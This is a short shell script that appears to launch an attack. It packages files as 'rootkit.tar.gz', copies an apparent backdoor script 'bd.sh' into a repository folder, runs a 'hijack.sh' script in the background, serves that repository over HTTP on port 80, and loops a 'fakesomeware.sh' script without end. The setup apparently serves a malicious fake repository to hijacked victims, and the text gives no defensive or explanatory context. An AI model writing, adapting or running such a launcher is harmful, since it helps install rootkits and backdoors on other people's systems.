#!/bin/sh
tar zcf rootkit.tar.gz *
mv rootkit.tar.gz rootkit/repo/Custom/
cp bd.sh rootkit/repo/
cd rootkit
./hijack.sh &
cd repo && python -m SimpleHTTPServer 80 &
while (true); do
    ./fakesomeware.sh
done
